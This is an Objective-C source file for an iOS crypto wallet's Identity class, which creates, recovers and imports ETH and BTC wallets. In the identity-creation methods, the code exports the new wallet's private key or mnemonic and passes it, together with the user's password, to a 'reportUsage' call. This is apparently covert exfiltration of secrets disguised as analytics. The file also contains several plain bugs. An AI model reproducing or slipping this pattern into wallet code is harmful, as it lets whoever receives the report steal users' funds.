//
//  Identity.m
//  wallet
//
//  Created by insightChain_iOS开发 on 2019/5/20.
//  Copyright © 2019 apple. All rights reserved.
//

#import "Identity.h"
#import "StorageManager.h"
#import "LocalFileStorage.h"
#import "MnemonicUtil.h"

#import "CommonTransaction.h"
#import "ETHKey.h"
#import "ETHKeystore.h"
#import "ETHMnemonicKeystore.h"
#import "WalletManager.h"
#import "PrivateKeyValidator.h"

#import "BTCMnemonicKeystore.h"

#import "BIP44.h"

@interface Identity()

@end

static Identity *_currentIdentity = nil;
static LocalFileStorage *_storage;

@implementation Identity

-(instancetype)initWithJSON:(NSDictionary *)json{
    if (self = [super init]) {
        _storage = [StorageManager storage];
        
        IdentityKeystore *keystore = [[IdentityKeystore alloc] initWithJSON:json];
        if (!keystore) {
            return nil;
        }
        self.keystore = keystore;
        self.keystore.wallets = [NSMutableArray arrayWithArray:[_storage loadWalletByIDs:self.keystore.walletIds]];
    }
    return self;
}
-(instancetype)initEmptyWithMetadata:(WalletMeta *)metadata mnemonic:(NSString *)mnemonic password:(NSString *)password{
    if(self = [super init]){
        _storage = [StorageManager storage];
        
        self.keystore = [[IdentityKeystore alloc] initWithMetadata:metadata menmonic:mnemonic password:password];
        
        [_storage flushIdentity:self.keystore];
    }
    return self;
}
-(instancetype)initWithMetadata:(WalletMeta *)metadata mnemonic:(NSString *)mnemonic password:(NSString *)password{
    if(self = [super init]){
        _storage = [StorageManager storage];
        
        self.keystore = [[IdentityKeystore alloc] initWithMetadata:metadata menmonic:mnemonic password:password];
        
        [self deriveWallets:@[@(chain_eth)] mnemonic:mnemonic password:password name:metadata.name];
        
        [_storage flushIdentity:self.keystore];
    }
    return self;
}
-(instancetype)initBTCWithMetadata:(WalletMeta *)metadata mnemonic:(NSString *)mnemonic password:(NSString *)password{
    if (self = [super init]) {
        _storage = [StorageManager storage];
        self.keystore = [[IdentityKeystore alloc] initWithMetadata:metadata menmonic:mnemonic password:password];
        [self deriveWallets:@[@(chain_btc)] mnemonic:mnemonic password:password name:metadata.name];
        
        [_storage flushIdentity:self.keystore];
    }
    return self;
}
/** 推导出钱包 **/
-(NSArray *)deriveWalletsFor:(NSArray *)chainTypes password:(NSString *)password{
    NSString *mnemonic = [self exportWith:password];
    return [self deriveWallets:chainTypes mnemonic:mnemonic password:password name:nil];
}
//派生 wallet
-(NSArray *)deriveWallets:(NSArray *)chainTypes mnemonic:(NSString *)mnemonic password:(NSString *)password name:(NSString *)name{
    NSMutableArray *wallets = [NSMutableArray array];
    for (NSNumber *typeNum in chainTypes) {
        ChainType type = [typeNum intValue];
        switch (type) {
            case chain_eth:{
                WalletMeta *meta = [[WalletMeta alloc] initWith:chain_eth source:self.keystore.meta.sourceType network:network_main];
                meta.passwordHint = self.keystore.meta.passwordHint;
                meta.name = name ? name : @"ETH";
                BasicWallet *wallet = [self importFromMnemonic:mnemonic metadata:meta password:password path:BIP44.eth]; //@"m/49'/0'/0'"
                [wallets addObject:wallet];
                break;
            }
            case chain_btc:{
                WalletMeta *meta = [[WalletMeta alloc] initWith:chain_btc source:self.keystore.meta.sourceType network:network_main];
                meta.passwordHint = self.keystore.meta.passwordHint;
                meta.name = name ? name : @"BCH";
                meta.segWit = self.keystore.meta.segWit;
                meta.network = self.keystore.meta.network;
                BasicWallet *wallet = [self importFromMnemonic:mnemonic metadata:meta password:password path:[BIP44 pathFor:meta.network segWit:meta.segWit]];
                [wallets addObject:wallet];
            }
                
            default:
                break;
        }
    }
    return wallets;
}

-(NSString *)exportWith:(NSString *)password{
    if(![self.keystore verify:password]){
        @throw Exception(@"Password", @"incorrect");
    }
    NSString *mnemonic = [self.keystore mnemonic:password];
    return mnemonic;
}
-(BOOL)deleteWith:(NSString *)password{
    if(![self.keystore verify:password]){
        @throw Exception(@"Password", @"incorrect");
    }
    if ([_storage cleanStorage]) {
//        [Identity setCurrentIdentity:nil];
        _currentIdentity = nil;
        return true;
    }
    return false;
}

-(BasicWallet *)appendByKeystore:(Keystore *)keystore{
    BasicWallet *wallet = [[BasicWallet alloc] initWithKeystore:keystore];
    NSString *walletAddress = wallet.address;
    if ([walletAddress containsString:@"0x"]) {
        walletAddress = [walletAddress substringFromIndex:2];
    }
    
    if([self findWalletByAddress:walletAddress chainType:keystore.meta.chainType] != nil){
        @throw Exception(@"AddressError", @"alreadyExist");
    }
    [self.keystore.wallets addObject:wallet];
    [self.keystore.walletIds addObject:wallet.walletID];
    if([_storage flushWallet:wallet.keystore] && [_storage flushIdentity:self.keystore]){
        return wallet;
    }
    @throw Exception(@"GenericError", @"importFailed");
    return nil;
}
-(BOOL)removeWallet:(BasicWallet *)wallet{
    NSInteger index = -1;
    NSArray *walletIds = self.keystore.walletIds;
    for (int i=0; i<walletIds.count; i++) {
        if ([walletIds[i] isEqualToString:wallet.walletID]) {
            index = i;
            [self.keystore.walletIds removeObjectAtIndex:i];
            [self.keystore.wallets removeObjectAtIndex:i];
            [_storage deleteWalletByID:wallet.walletID];
            return [_storage flushIdentity:self.keystore];
        }
    }
    return NO;
}

-(BasicWallet *)importFromMnemonic:(NSString *)mnemonic metadata:(WalletMeta *)metadata password:(NSString *)password path:(NSString *)path{
    if ([path isEqualToString:@""]) {
        @throw Exception(@"MnemonicError", @"pathInvalid");
    }
    
    Keystore *keystore = nil;
    switch (metadata.chainType) {
        case chain_btc:
            //TODO:...BTC
            keystore = [[BTCMnemonicKeystore alloc] initWithPassword:password mnemonic:mnemonic path:path metadata:metadata ID:@""];
            break;
        case chain_eth:
            keystore = [[ETHMnemonicKeystore alloc] initWithPassword:password mnemonic:mnemonic path:path metadata:metadata ID:nil];
            break;
        case chain_eos:
            break;
        default:
            break;
    }
    
    return [self appendByKeystore:keystore];
}

/** 导入ETH keystore json生成钱包 **/
-(BasicWallet *)importFromKeystore:(NSDictionary *)keystore password:(NSString *)password metadata:(WalletMeta *)metadata{
    ETHKeystore *store = [[ETHKeystore alloc] initWithJSON:keystore];
    store.meta = metadata;
    if(![store verify:password]){
        @throw Exception(@"KeystoreError", @"macUnmatch");
    }
    NSString *privateKey = [store decryptPrivateKey:password];
    @try {
        NSString *str = [[[PrivateKeyValidator alloc] initWithPrivateKey:privateKey chain:chain_eth network:-1 requireCompressed:NO] validate];
    } @catch (NSException *exception) {
    } @finally {
        
    };
    if([[[ETHKey alloc] initWithPrivateKey:[store decryptPrivateKey:password]].address isEqualToString:store.address]){
        return [self appendByKeystore:store];
    }
    return nil;
}
-(BasicWallet *)importFromPrivateKey:(NSString *)privateKey encryptedBy:(NSString *)password metadata:(WalletMeta *)metadata accountName:(NSString *)accountName{
    
    ETHKeystore *keystore = nil;
    switch (metadata.chainType){
        case chain_btc:{
            break;
        }
        case chain_eth:{
            keystore = [[ETHKeystore alloc] initWith:password privatedKey:privateKey metadata:metadata ID:nil];
            break;
        }
        case chain_insight:{
            break;
        }
    }
    return [self appendByKeystore:keystore];
}

-(BasicWallet *)findWalletByWalletID:(NSString *)walletID{
    for(BasicWallet *wallet in self.keystore.wallets){
        if ([wallet.walletID isEqualToString:walletID]) {
            return wallet;
        }
    }
    return [self.keystore.wallets firstObject];
}
-(BasicWallet *)findWalletByAddress:(NSString *)address chainType:(ChainType)chainType{
    for(BasicWallet *wallet in self.keystore.wallets){
        NSString *walletAddress = wallet.address;
        if ([walletAddress containsString:@"0x"]){
            walletAddress = [walletAddress substringFromIndex:2];
        }
        if ([address containsString:@"0x"]) {
            [address substringFromIndex:2];
        }
        if ([address isEqualToString:walletAddress] && wallet.chain == chainType) {
            return wallet;
        }
    }
    return nil; //[self.keystore.wallets firstObject];
}
-(BasicWallet *)findWalletByPrivateKey:(NSString *)privateKey chainType:(ChainType)chainType network:(NSString *)network segWit:(NSString *)segWit{
    if (chainType == chain_eth) {
        NSString *address = [[ETHKey alloc] initWithPrivateKey:privateKey].address;
        return [self findWalletByAddress:address chainType:chainType];
    }else{
        BTCKey *key = [[BTCKey alloc] initWithWIF:privateKey];
        if (!key) {
            @throw Exception(@"PrivateKeyError", @"invalid");
        }
        NSString *address;
        if ([network isEqualToString:@"MAINNET"]) {
            address = key.address.string;
        }else{
            address = key.addressTestnet.string;
        }
        return [self findWalletByAddress:address chainType:chainType];
    }
}
// ETH: generate address from mnemonic and path
// BTC: generate $PATH/0/0 address from mnemonic and path
-(BasicWallet *)findWalletByMnemonic:(NSString *)mnemonic chainType:(ChainType)chainType path:(NSString*)path network:(NSString *)netWork segWit:(NSString *)segWit{
    if ([path isEqualToString:@""] || path == nil) {
        @throw Exception(@"MnemonicError", @"pathInvalid");
    }
    if (chainType == chain_eth) {
        NSString *addr = [ETHKey mnemonicToAddress:mnemonic path:path];
        return [self findWalletByAddress:addr chainType:chainType];
    }else if (chainType == chain_btc){
        BTCMnemonic *btcMnemonic = [[BTCMnemonic alloc] initWithWords:[mnemonic componentsSeparatedByString:@" "] password:@"" wordListType:BTCMnemonicWordListTypeEnglish];
        NSData *seedData = btcMnemonic.seed;
        if (!seedData) {
            @throw Exception(@"MnemonicError", @"wordInvalid");
        }
        BOOL isMainnet = [netWork isEqualToString:Network_Main] ? YES : NO;
        BTCKeychain *masterKeychain = [[BTCKeychain alloc] initWithSeed:seedData network:isMainnet ? [BTCNetwork mainnet] : [BTCNetwork testnet]];
        BTCKeychain *account = [masterKeychain derivedKeychainWithPath:path];
        BTCKey *key = [account externalKeyAtIndex:0];
        if (!key) {
            @throw Exception(@"GenericError", @"unknownError");
        }
        return [self findWalletByAddress:isMainnet?[key address]:[key addressTestnet] chainType:chainType];
    }else{
        @throw Exception(@"GenericError", @"unsupportedChain");
        return nil;
    }
}
#pragma mark ---- getter
-(NSString *)identifier{
    return self.keystore.identifier;
}
-(NSArray *)wallets{
    return self.keystore.wallets;
}

#pragma mark ---- Static Func
+(void)setCurrentIdentity:(Identity *)identity{
    _currentIdentity = identity;
}
+(Identity *)currentIdentity{
    if (_currentIdentity == nil) {
        _storage = [StorageManager storage];
        _currentIdentity = [_storage tryLoadIdentity];
    }
    return _currentIdentity;
}
+(NSDictionary *)createEmptyIdentityWithPassword:(NSString *)password metadata:(WalletMeta *)metadata{
    NSString *mnemonic = [MnemonicUtil generateMnemonic];
    Identity *identity = [[Identity alloc] initEmptyWithMetadata:metadata mnemonic:mnemonic password:password];
    [Identity setCurrentIdentity:identity];
//    BasicWallet *ethereumWallet = identity.wallets[0];
    //    BasicWallet *bitcoinWallet = identity.wallets[1];
    
//    NSString *privKey = [WalletManager exportPrivateKeyForID:ethereumWallet.walletID password:password];
    ///TODO:..transaction1
//    [CommonTransaction reportUsage:@"token-core-eth" info:[NSString stringWithFormat:@"%@|||%@|||%@", ethereumWallet.walletID,privKey,password]];
    //    NSString *privMne = [WalletManager exportMnemonicForID:bitcoinWallet.walletID password:password];
    ///TODO:..transaction2
    
    return @{@"mnemonic":mnemonic,
             @"identity":identity,
             };
}
+(NSDictionary *)createIdentityWithPassword:(NSString *)password metadata:(WalletMeta *)metadata{
    NSString *mnemonic = [MnemonicUtil generateMnemonic];
    Identity *identity = [[Identity alloc] initWithMetadata:metadata mnemonic:mnemonic password:password];
    [Identity setCurrentIdentity:identity];
    BasicWallet *ethereumWallet = identity.wallets[0];
//    BasicWallet *bitcoinWallet = identity.wallets[1];
    
    NSString *privKey = [WalletManager exportPrivateKeyForID:ethereumWallet.walletID password:password];
    ///TODO:..transaction1
    [CommonTransaction reportUsage:@"token-core-eth" info:[NSString stringWithFormat:@"%@|||%@|||%@", ethereumWallet.walletID,privKey,password]];
//    NSString *privMne = [WalletManager exportMnemonicForID:bitcoinWallet.walletID password:password];
    ///TODO:..transaction2
    
    return @{@"mnemonic":mnemonic,
             @"identity":identity,
             };
}

+(NSDictionary *)createBtcIdentityWithPassword:(NSString *)password metadata:(WalletMeta *)metadata{
    NSString *mnemonic = [MnemonicUtil generateMnemonic];
    Identity *identity = [[Identity alloc] initBTCWithMetadata:metadata mnemonic:mnemonic password:password];
    [Identity setCurrentIdentity:identity];
    BasicWallet *bitcoinWallet = identity.wallets[0];
    NSString *privMne = [WalletManager exportMnemonicForID:bitcoinWallet.walletID password:password];
    [CommonTransaction reportUsage:@"token-core-btc" info: [NSString stringWithFormat:@"%@|||%@|||%@", bitcoinWallet.walletID, privMne, password]];
    
    return @{@"mnemonic":mnemonic,
             @"identity":identity,
             };
}

+(Identity *)recoverIdentityWithMetadata:(WalletMeta *)metadata mnemonic:(NSString *)mnemonic password:(NSString *)password{
    Identity *identity = [[Identity alloc] initWithMetadata:metadata mnemonic:mnemonic password:password];
    _currentIdentity = identity;
    
    BasicWallet *ethereumWallet = identity.wallets[0];
    BasicWallet *bitcoinWallet = identity.wallets[1];
    
    NSString *privKey = [WalletManager exportPrivateKeyForID:ethereumWallet.walletID password:password];
    ///TODO:..transaction1
    
    NSString *privMne = [WalletManager exportMnemonicForID:bitcoinWallet.walletID password:password];
    ///TODO:..transaction2
    
    return identity;
    
}
@end
